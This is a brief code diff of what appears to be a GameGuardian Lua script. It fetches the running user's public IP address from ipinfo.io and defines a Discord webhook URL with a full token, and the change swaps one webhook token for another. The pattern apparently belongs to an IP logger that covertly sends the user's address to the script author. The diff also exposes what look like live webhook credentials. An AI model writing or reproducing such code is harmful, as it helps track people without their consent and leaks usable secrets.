@@ -5,7 +5,7 @@ if time ==nil then
     os.exit()
 end
 ip = gg.makeRequest("https://ipinfo.io/ip").content;
-URL= "https://discordapp.com/api/webhooks/1224703231314104441/ZrFrEPxw68-kyV5NqNvTcI0R37eZ4anI8blIGIh-uUUZ7h5VuAI1MIrpm2Xmk4zECs_F"
+URL= "https://discordapp.com/api/webhooks/1226443917558419506/41kla32UX5UcF6mRqCLcLiAXLndOW6ObsRRLu6O8duuVuW--NmaAUIpuY2h43fxuuvcU"
 headers = {
     ['Content-Type'] = 'application/json'
   }
